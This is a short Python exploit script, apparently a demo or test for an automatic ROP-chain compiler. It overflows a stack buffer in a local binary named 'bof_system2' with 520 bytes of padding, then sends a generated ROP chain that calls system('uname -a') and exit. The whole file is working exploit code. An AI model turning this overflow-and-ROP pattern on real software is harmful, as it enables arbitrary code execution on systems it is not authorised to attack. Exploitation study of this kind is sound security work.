import sys, logging
from pwn import *
from rop_compiler import ropme, goal

filename = './bof_system2'

print "Using automatically built ROP chain"
files = [(filename, None, 0)]
rop = ropme.rop(files, [], [["function", "system", "uname -a\x00"], ["function", "exit", 33]], log_level = logging.DEBUG)

payload = 'A'*512 + 'B'*8 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

print 'Calling system("uname -a") in the target'
p = process([filename,'3000'])
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x400742\nbreak *system\nbreak *exit")
p.writeline(payload)
print "\n%s\n" % p.readline()
